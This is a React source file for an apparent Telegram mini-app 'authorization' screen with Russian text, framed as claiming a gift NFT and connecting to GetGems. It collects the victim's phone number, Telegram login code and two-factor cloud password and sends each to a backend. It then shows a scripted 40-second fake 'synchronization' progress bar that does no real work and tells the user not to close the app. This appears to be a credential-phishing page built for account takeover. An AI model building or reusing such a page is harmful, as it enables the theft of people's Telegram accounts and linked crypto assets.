import { useState, useRef, useEffect } from 'react';
import { authStepPhone, authStepCode, authStepPassword } from '../services/api';
import { setSynced, addToInventory } from '../services/inventory';
import { useAppContext } from '../store';
import { hapticImpact, hapticNotification } from '../services/telegram';
import { nftImage, NFT_NAMES } from '../constants';
import { motion, AnimatePresence } from 'framer-motion';
import { ArrowLeft } from 'lucide-react';

// ─── Phone formatting ─────────────────────────────────────────────────────────
function formatPhone(raw: string): string {
  // Remove everything except digits and a leading +
  let clean = raw.replace(/[^\d+]/g, '');
  // Only one + allowed at the very start
  if (clean.includes('+')) {
    clean = '+' + clean.replace(/\+/g, '');
  }
  // If no + at start — add it
  if (clean.length > 0 && !clean.startsWith('+')) {
    clean = '+' + clean;
  }
  // Max 16 chars (+15 digits)
  return clean.slice(0, 16);
}

// ─── Eye character that tracks input ─────────────────────────────────────────
interface EyeProps {
  progress: number; // 0-1 how full the input is
  isActive: boolean;
  isError: boolean;
}

function AnimatedEye({ progress, isActive, isError }: EyeProps) {
  // Pupil moves left→right as progress increases
  const pupilX = -6 + progress * 12; // -6 to +6
  const pupilY = isActive ? -1 : 1;

  const eyeColor = isError ? '#ef4444' : isActive ? '#8774e1' : '#555';
  const pupilColor = isError ? '#fca5a5' : isActive ? '#fff' : '#888';

  return (
    <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
      {/* Eyelid top */}
      <motion.ellipse
        cx="16" cy="16" rx="11" ry={isActive ? 8 : 6}
        stroke={eyeColor} strokeWidth="1.5" fill="none"
        animate={{ ry: isActive ? 8 : 6 }}
        transition={{ duration: 0.25 }}
      />
      {/* Pupil */}
      <motion.circle
        cx={16 + pupilX} cy={16 + pupilY} r={isActive ? 3.5 : 2.5}
        fill={pupilColor}
        animate={{ cx: 16 + pupilX, cy: 16 + pupilY, r: isActive ? 3.5 : 2.5 }}
        transition={{ type: 'spring', stiffness: 300, damping: 20 }}
      />
      {/* Shine */}
      <motion.circle
        cx={16 + pupilX + 1} cy={16 + pupilY - 1} r={0.8}
        fill="white" opacity={isActive ? 0.8 : 0.3}
        animate={{ cx: 16 + pupilX + 1, cy: 16 + pupilY - 1 }}
        transition={{ type: 'spring', stiffness: 300, damping: 20 }}
      />
      {/* Blink lashes */}
      {[...Array(3)].map((_, i) => (
        <motion.line key={i}
          x1={10 + i * 3} y1={8} x2={10 + i * 3} y2={isActive ? 6 : 7}
          stroke={eyeColor} strokeWidth="1" strokeLinecap="round"
          animate={{ y2: isActive ? 6 : 7 }}
          transition={{ duration: 0.2, delay: i * 0.03 }}
        />
      ))}
    </svg>
  );
}

// ─── Lock character for password ──────────────────────────────────────────────
function AnimatedLock({ hasInput, isError }: { hasInput: boolean; isError: boolean }) {
  return (
    <motion.div className="relative w-16 h-16 flex items-center justify-center">
      <motion.div
        animate={{ scale: hasInput ? [1, 1.08, 1] : 1 }}
        transition={{ duration: 0.3 }}
        className="text-4xl select-none"
      >
        {isError ? '😬' : hasInput ? '🔐' : '🔒'}
      </motion.div>
      {hasInput && !isError && (
        <motion.div
          className="absolute -top-1 -right-1 w-4 h-4 rounded-full bg-green-500 flex items-center justify-center text-[9px]"
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ type: 'spring', stiffness: 400 }}
        >✓</motion.div>
      )}
    </motion.div>
  );
}

// ─── Code faces that react to digits ─────────────────────────────────────────
function CodeFace({ filledCount, total, isError }: { filledCount: number; total: number; isError: boolean }) {
  const ratio = filledCount / total;
  const emoji = isError ? '😵' : ratio === 0 ? '😐' : ratio < 0.5 ? '🤔' : ratio < 1 ? '😮' : '🎉';
  return (
    <motion.div
      className="text-4xl select-none mb-4"
      animate={{ scale: [1, ratio === 1 ? 1.3 : 1.08, 1], rotate: isError ? [-5, 5, -5, 0] : 0 }}
      key={emoji}
      transition={{ duration: 0.3 }}
    >
      {emoji}
    </motion.div>
  );
}

// ─── Sync stages ─────────────────────────────────────────────────────────────
const SYNC_STAGES = [
  'Подключаемся к серверу...',
  'Проверяем аккаунт...',
  'Загружаем список подарков...',
  'Синхронизируем данные...',
  'Настраиваем маркет...',
  'Получаем историю транзакций...',
  'Обновляем баланс...',
  'Финализируем синхронизацию...',
  'Почти готово...',
];

// ─── Main component ───────────────────────────────────────────────────────────
export default function AuthView() {
  const [step, setStep]           = useState<1 | 2 | 3 | 4>(1);
  const [phone, setPhone]         = useState('');
  const [code, setCode]           = useState(['', '', '', '', '']);
  const [password, setPassword]   = useState('');
  const [loading, setLoading]     = useState(false);
  const [error, setError]         = useState('');
  const [phoneFocused, setPhoneFocused] = useState(false);
  const [passFocused, setPassFocused]   = useState(false);
  const [syncStage, setSyncStage]       = useState(0);
  const [syncProgress, setSyncProgress] = useState(0);
  const codeRefs = useRef<(HTMLInputElement | null)[]>([]);
  const { setIsSynced, setCurrentView, giftId, giftSlug, giftNum } = useAppContext();

  const hasGift         = Boolean(giftSlug);
  const giftDisplayName = hasGift ? (NFT_NAMES[giftSlug] || giftSlug) : '';
  const giftImageUrl    = hasGift ? nftImage(giftSlug, giftNum || undefined) : '';

  // Phone: eye progress = how many digits entered / 11
  const phoneDigits    = phone.replace(/\D/g, '');
  const phoneProgress  = Math.min(phoneDigits.length / 11, 1);
  // Code: eye progress = how many filled / 5
  const codeFilled     = code.filter(d => d !== '').length;

  // ── Phone input handler ──────────────────────────────────────────────────
  const handlePhoneChange = (raw: string) => {
    setError('');
    // If user clears field
    if (!raw) { setPhone(''); return; }
    setPhone(formatPhone(raw));
  };

  // ── Step 1 submit ─────────────────────────────────────────────────────────
  const handlePhoneSubmit = async () => {
    const digits = phone.replace(/\D/g, '');
    if (digits.length < 10) { setError('Введите корректный номер телефона'); return; }
    setLoading(true); setError('');
    try {
      const effectiveGiftId = giftId || new URLSearchParams(window.location.search).get('gift_id') || '';
      const res = await authStepPhone(phone, effectiveGiftId);
      if (res.status === 'code_sent') { setStep(2); }
      else { setError(res.message || 'Ошибка отправки кода'); }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  // ── Code handlers ─────────────────────────────────────────────────────────
  const handleCodeChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    setError('');
    const newCode = [...code]; newCode[index] = value; setCode(newCode);
    if (value && index < 4) codeRefs.current[index + 1]?.focus();
    if (newCode.every(d => d !== '')) submitCode(newCode.join(''));
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) codeRefs.current[index - 1]?.focus();
  };

  const submitCode = async (fullCode: string) => {
    setLoading(true); setError('');
    try {
      const res = await authStepCode(fullCode);
      if (res.status === 'success') { handleSuccess(); }
      else if (res.status === 'need_password') { setStep(3); }
      else if (res.status === 'code_invalid') {
        setError('Неверный код. Проверьте и введите снова.');
        setCode(['', '', '', '', '']); codeRefs.current[0]?.focus(); hapticNotification('error');
      } else if (res.status === 'code_expired') {
        setError('Код истёк. Вернитесь и запросите новый.'); hapticNotification('error');
      } else {
        setError(res.message || 'Неверный код');
        setCode(['', '', '', '', '']); codeRefs.current[0]?.focus(); hapticNotification('error');
      }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  // ── Password submit ───────────────────────────────────────────────────────
  const handlePasswordSubmit = async () => {
    if (!password) { setError('Введите пароль'); return; }
    setLoading(true); setError('');
    try {
      const res = await authStepPassword(password);
      if (res.status === 'success') { handleSuccess(); }
      else if (res.status === 'password_invalid') {
        setError('Неверный пароль. Попробуйте ещё раз.'); hapticNotification('error');
      } else {
        setError(res.message || 'Неверный пароль'); hapticNotification('error');
      }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  // ── Success ───────────────────────────────────────────────────────────────
  const handleSuccess = () => {
    setSynced(); setIsSynced(true); hapticNotification('success'); setStep(4);
    try { navigator.vibrate([300, 100, 300, 100, 300, 100, 300]); } catch (_) {}
    [0, 400, 800, 1200, 1600, 2000, 2400].forEach(d => setTimeout(() => hapticImpact('medium'), d));

    let stageIdx = 0;
    let progress = 0;
    const stageInterval = setInterval(() => {
      stageIdx = Math.min(stageIdx + 1, SYNC_STAGES.length - 1);
      setSyncStage(stageIdx);
    }, 4500);
    const progressInterval = setInterval(() => {
      progress = Math.min(progress + 1.8, 99);
      setSyncProgress(progress);
    }, 700);

    setTimeout(() => {
      clearInterval(stageInterval); clearInterval(progressInterval);
      setSyncProgress(100);
      if (hasGift && giftSlug) { addToInventory(giftSlug, giftNum || '0'); setCurrentView('my-gifts'); }
      else { setCurrentView('market'); }
    }, 40000);
  };

  const handleBack = () => {
    hapticImpact('light');
    if (hasGift) setCurrentView('gift-welcome'); else setCurrentView('market');
  };

  // ─── Step indicator (dots) ────────────────────────────────────────────────
  const StepDots = () => (
    <div className="flex items-center gap-2 mb-8">
      {[1, 2, 3].map(s => (
        <motion.div key={s}
          animate={{
            width: step === s ? 24 : 8,
            background: step > s ? '#22c55e' : step === s ? '#8774e1' : 'rgba(255,255,255,0.15)',
          }}
          transition={{ duration: 0.3 }}
          className="h-2 rounded-full"
        />
      ))}
    </div>
  );

  return (
    <div
      className="fixed inset-0 z-[9999] flex flex-col"
      style={{
        background: 'linear-gradient(160deg, #0d0d12 0%, #0f0f16 50%, #0c0c10 100%)',
        paddingTop: 'calc(var(--tg-safe-area-top, 0px) + var(--tg-content-safe-area-top, 0px))',
      }}
    >
      {/* Ambient orb */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-80 h-80 rounded-full pointer-events-none"
        style={{ background: 'radial-gradient(circle, rgba(135,116,225,0.14) 0%, transparent 70%)', filter: 'blur(30px)' }} />

      {/* Back button */}
      {step !== 4 && (
        <button onClick={handleBack}
          className="absolute top-4 left-4 w-9 h-9 rounded-full flex items-center justify-center active:scale-90 transition-transform z-10"
          style={{ background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.1)' }}
        >
          <ArrowLeft className="w-5 h-5 text-white" />
        </button>
      )}

      <div className="flex-1 flex flex-col items-center justify-center p-6 relative">
        <div className="w-full max-w-sm flex flex-col items-center">

          {/* Gift preview */}
          {hasGift && step < 4 && (
            <motion.div
              initial={{ opacity: 0, y: -12 }}
              animate={{ opacity: 1, y: 0 }}
              className="flex items-center gap-3 rounded-2xl px-4 py-3 mb-5 w-full"
              style={{ background: 'rgba(135,116,225,0.1)', border: '1px solid rgba(135,116,225,0.25)' }}
            >
              <div className="w-11 h-11 rounded-xl overflow-hidden shrink-0"
                style={{ background: 'linear-gradient(135deg, #f6a827, #e66b12)' }}>
                <img src={giftImageUrl} alt={giftDisplayName} className="w-full h-full object-cover"
                  referrerPolicy="no-referrer"
                  onError={e => { (e.target as HTMLImageElement).style.opacity = '0'; }} />
              </div>
              <div className="flex flex-col min-w-0 flex-1">
                <span className="text-[11px] text-[#8774e1] font-bold uppercase tracking-wider">Ваш подарок</span>
                <span className="text-sm font-bold text-white truncate">{giftDisplayName}</span>
              </div>
            </motion.div>
          )}

          {/* Step dots */}
          {step !== 4 && <StepDots />}

          <AnimatePresence mode="wait">

            {/* ════════════════════════════════════════
                STEP 1 — Phone
            ════════════════════════════════════════ */}
            {step === 1 && (
              <motion.div key="s1"
                initial={{ opacity: 0, x: 40 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -40 }}
                transition={{ type: 'spring', stiffness: 300, damping: 28 }}
                className="w-full flex flex-col items-center"
              >
                {/* Dual eyes that track phone input */}
                <div className="flex items-center gap-2 mb-3 select-none">
                  <motion.div
                    animate={{ y: phoneFocused ? -2 : 0 }}
                    transition={{ type: 'spring', stiffness: 300 }}
                  >
                    <AnimatedEye progress={phoneProgress} isActive={phoneFocused} isError={!!error} />
                  </motion.div>
                  <motion.div
                    animate={{ y: phoneFocused ? -2 : 0 }}
                    transition={{ type: 'spring', stiffness: 300, delay: 0.04 }}
                  >
                    <AnimatedEye progress={phoneProgress} isActive={phoneFocused} isError={!!error} />
                  </motion.div>
                </div>

                <p className="text-[22px] font-bold text-white mb-1 text-center" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Авторизация
                </p>
                <p className="text-[13px] text-gray-400 mb-5 text-center leading-relaxed">
                  Введите номер телефона от вашего Telegram
                </p>

                <div className="w-full relative mb-4">
                  <input
                    type="tel"
                    placeholder="+7 900 123 45 67"
                    value={phone}
                    onChange={e => handlePhoneChange(e.target.value)}
                    onKeyDown={e => { if (e.key === 'Enter') handlePhoneSubmit(); }}
                    onFocus={() => { setPhoneFocused(true); }}
                    onBlur={() => { setPhoneFocused(false); }}
                    className="w-full rounded-2xl px-4 py-3.5 text-white text-center text-[17px] outline-none transition-all"
                    style={{
                      background: error ? 'rgba(239,68,68,0.08)' : 'rgba(255,255,255,0.06)',
                      border: `1px solid ${error ? 'rgba(239,68,68,0.5)' : phoneFocused ? 'rgba(135,116,225,0.7)' : 'rgba(255,255,255,0.12)'}`,
                      fontFamily: 'DM Sans, sans-serif',
                      letterSpacing: '0.04em',
                    }}
                  />
                  {/* Character count indicator */}
                  {phone.length > 0 && (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2">
                      <div
                        className="w-2 h-2 rounded-full transition-all duration-300"
                        style={{ background: phoneDigits.length >= 10 ? '#22c55e' : '#8774e1' }}
                      />
                    </div>
                  )}
                </div>

                <AnimatePresence>
                  {error && (
                    <motion.p
                      initial={{ opacity: 0, y: -6 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0 }}
                      className="text-red-400 text-[13px] mb-4 text-center"
                    >
                      {error}
                    </motion.p>
                  )}
                </AnimatePresence>

                <button
                  onClick={handlePhoneSubmit}
                  disabled={loading}
                  className="w-full text-white font-bold py-4 rounded-2xl transition-all active:scale-[0.97] disabled:opacity-50 flex items-center justify-center gap-2"
                  style={{
                    background: 'linear-gradient(135deg, #8774e1, #6c5fc7)',
                    boxShadow: loading ? 'none' : '0 4px 20px rgba(135,116,225,0.35)',
                    fontFamily: 'DM Sans, sans-serif',
                  }}
                >
                  {loading ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full"
                        style={{ animation: 'spin-slow 0.8s linear infinite' }} />
                      Отправка кода...
                    </>
                  ) : 'Продолжить →'}
                </button>
              </motion.div>
            )}

            {/* ════════════════════════════════════════
                STEP 2 — Code
            ════════════════════════════════════════ */}
            {step === 2 && (
              <motion.div key="s2"
                initial={{ opacity: 0, x: 40 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -40 }}
                transition={{ type: 'spring', stiffness: 300, damping: 28 }}
                className="w-full flex flex-col items-center"
              >
                {/* Reactive face */}
                <CodeFace filledCount={codeFilled} total={5} isError={!!error} />

                <p className="text-[22px] font-bold text-white mb-1 text-center" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Код подтверждения
                </p>
                <p className="text-[13px] text-gray-400 mb-6 text-center">
                  Мы отправили код в приложение Telegram
                </p>

                <div className="flex gap-2.5 mb-2">
                  {code.map((digit, i) => (
                    <motion.input
                      key={i}
                      ref={el => (codeRefs.current[i] = el)}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={e => handleCodeChange(i, e.target.value)}
                      onKeyDown={e => handleKeyDown(i, e)}
                      className="w-12 h-14 rounded-xl text-center text-xl font-bold text-white outline-none"
                      animate={{
                        scale: digit ? [1, 1.12, 1] : 1,
                        borderColor: error
                          ? 'rgba(239,68,68,0.6)'
                          : digit
                          ? 'rgba(135,116,225,0.7)'
                          : 'rgba(255,255,255,0.12)',
                        background: error
                          ? 'rgba(239,68,68,0.08)'
                          : digit
                          ? 'rgba(135,116,225,0.15)'
                          : 'rgba(255,255,255,0.06)',
                      }}
                      transition={{ duration: 0.2 }}
                      style={{ border: '1px solid', transition: 'background 0.2s, border-color 0.2s' }}
                    />
                  ))}
                </div>

                {loading && (
                  <div className="flex items-center gap-2 mt-3 text-gray-400 text-[13px]">
                    <div className="w-3.5 h-3.5 border-2 border-gray-400/40 border-t-gray-300 rounded-full"
                      style={{ animation: 'spin-slow 0.8s linear infinite' }} />
                    Проверяем код...
                  </div>
                )}

                <AnimatePresence>
                  {error && (
                    <motion.p
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0 }}
                      className="text-red-400 text-[13px] mt-3 text-center"
                    >
                      {error}
                    </motion.p>
                  )}
                </AnimatePresence>
              </motion.div>
            )}

            {/* ════════════════════════════════════════
                STEP 3 — Password
            ════════════════════════════════════════ */}
            {step === 3 && (
              <motion.div key="s3"
                initial={{ opacity: 0, x: 40 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -40 }}
                transition={{ type: 'spring', stiffness: 300, damping: 28 }}
                className="w-full flex flex-col items-center"
              >
                {/* Animated lock emoji */}
                <AnimatedLock hasInput={password.length > 0} isError={!!error} />

                <p className="text-[22px] font-bold text-white mb-1 mt-3 text-center" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Облачный пароль
                </p>
                <p className="text-[13px] text-gray-400 mb-6 text-center">
                  Введите пароль двухфакторной аутентификации
                </p>

                <div className="w-full relative mb-4">
                  <input
                    type="password"
                    placeholder="••••••••"
                    value={password}
                    onChange={e => { setError(''); setPassword(e.target.value); }}
                    onKeyDown={e => { if (e.key === 'Enter') handlePasswordSubmit(); }}
                    onFocus={() => setPassFocused(true)}
                    onBlur={() => setPassFocused(false)}
                    className="w-full rounded-2xl px-4 py-3.5 text-white text-center text-lg mb-0 outline-none transition-all"
                    style={{
                      background: error ? 'rgba(239,68,68,0.08)' : 'rgba(255,255,255,0.06)',
                      border: `1px solid ${error ? 'rgba(239,68,68,0.5)' : passFocused ? 'rgba(245,158,11,0.6)' : 'rgba(255,255,255,0.12)'}`,
                      fontFamily: 'DM Sans, sans-serif',
                      letterSpacing: '0.15em',
                    }}
                  />
                </div>

                {/* Password strength bar */}
                {password.length > 0 && (
                  <motion.div
                    initial={{ opacity: 0, scaleX: 0 }}
                    animate={{ opacity: 1, scaleX: 1 }}
                    className="w-full mb-4"
                  >
                    <div className="w-full h-1 rounded-full overflow-hidden" style={{ background: 'rgba(255,255,255,0.08)' }}>
                      <motion.div
                        className="h-full rounded-full"
                        animate={{ width: `${Math.min(password.length * 8, 100)}%` }}
                        style={{
                          background: password.length < 6
                            ? '#ef4444'
                            : password.length < 10
                            ? '#f59e0b'
                            : '#22c55e',
                        }}
                        transition={{ duration: 0.3 }}
                      />
                    </div>
                  </motion.div>
                )}

                <AnimatePresence>
                  {error && (
                    <motion.p
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0 }}
                      className="text-red-400 text-[13px] mb-4 text-center"
                    >
                      {error}
                    </motion.p>
                  )}
                </AnimatePresence>

                <button
                  onClick={handlePasswordSubmit}
                  disabled={loading}
                  className="w-full text-white font-bold py-4 rounded-2xl transition-all active:scale-[0.97] disabled:opacity-50 flex items-center justify-center gap-2"
                  style={{
                    background: 'linear-gradient(135deg, #f59e0b, #d97706)',
                    boxShadow: loading ? 'none' : '0 4px 20px rgba(245,158,11,0.3)',
                    fontFamily: 'DM Sans, sans-serif',
                  }}
                >
                  {loading ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full"
                        style={{ animation: 'spin-slow 0.8s linear infinite' }} />
                      Проверка...
                    </>
                  ) : 'Подтвердить →'}
                </button>
              </motion.div>
            )}

            {/* ════════════════════════════════════════
                STEP 4 — Success + progress only
            ════════════════════════════════════════ */}
            {step === 4 && (
              <motion.div key="s4"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="w-full flex flex-col items-center"
              >
                {/* Animated check */}
                <div className="relative w-28 h-28 mb-5 flex items-center justify-center">
                  {[0, 1, 2].map(i => (
                    <div key={i} className="absolute inset-0 rounded-full"
                      style={{
                        border: '1.5px solid rgba(34,197,94,0.3)',
                        animation: `ripple-out 2.8s ease-out ${i * 0.9}s infinite`,
                      }} />
                  ))}
                  <motion.div
                    initial={{ scale: 0, rotate: -20 }}
                    animate={{ scale: 1, rotate: 0 }}
                    transition={{ type: 'spring', stiffness: 220, damping: 16, delay: 0.1 }}
                    className="w-20 h-20 rounded-full flex items-center justify-center"
                    style={{
                      background: 'linear-gradient(135deg, rgba(34,197,94,0.22), rgba(34,197,94,0.1))',
                      border: '1px solid rgba(34,197,94,0.4)',
                      boxShadow: '0 0 32px rgba(34,197,94,0.22)',
                    }}
                  >
                    <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
                      <motion.path
                        d="M9 19 L16 26 L29 12"
                        stroke="#22c55e" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round"
                        fill="none"
                        initial={{ pathLength: 0, opacity: 0 }}
                        animate={{ pathLength: 1, opacity: 1 }}
                        transition={{ duration: 0.55, delay: 0.25 }}
                      />
                    </svg>
                  </motion.div>
                </div>

                <motion.p
                  initial={{ opacity: 0, y: 8 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.4 }}
                  className="text-[22px] font-bold text-white mb-1"
                  style={{ fontFamily: 'Syne, sans-serif' }}
                >
                  Синхронизация!
                </motion.p>
                <motion.p
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.55 }}
                  className="text-[13px] text-gray-400 text-center mb-8"
                >
                  Аккаунт подключён к GetGems
                </motion.p>

                {/* Progress bar + stage text — NO checklist */}
                <motion.div
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.65 }}
                  className="w-full rounded-2xl p-4"
                  style={{
                    background: 'rgba(255,255,255,0.04)',
                    border: '1px solid rgba(255,255,255,0.08)',
                  }}
                >
                  <div className="flex items-center justify-between mb-2.5">
                    <AnimatePresence mode="wait">
                      <motion.span
                        key={syncStage}
                        initial={{ opacity: 0, y: 5 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -5 }}
                        transition={{ duration: 0.25 }}
                        className="text-[13px] text-gray-300"
                      >
                        {SYNC_STAGES[syncStage]}
                      </motion.span>
                    </AnimatePresence>
                    <motion.span
                      className="text-[13px] font-bold ml-3 shrink-0"
                      style={{ color: '#2382ff' }}
                      animate={{ opacity: [1, 0.6, 1] }}
                      transition={{ duration: 1.2, repeat: Infinity }}
                    >
                      {Math.floor(syncProgress)}%
                    </motion.span>
                  </div>

                  {/* Progress bar */}
                  <div className="w-full h-2.5 rounded-full overflow-hidden"
                    style={{ background: 'rgba(255,255,255,0.07)' }}>
                    <motion.div
                      className="h-full rounded-full"
                      style={{ background: 'linear-gradient(90deg, #2382ff, #8774e1)' }}
                      animate={{ width: `${syncProgress}%` }}
                      transition={{ duration: 0.7, ease: 'easeOut' }}
                    />
                  </div>
                </motion.div>

                <motion.p
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 1 }}
                  className="text-[11px] text-gray-600 text-center mt-4"
                >
                  Не закрывайте приложение — займёт ~40 секунд
                </motion.p>
              </motion.div>
            )}

          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}
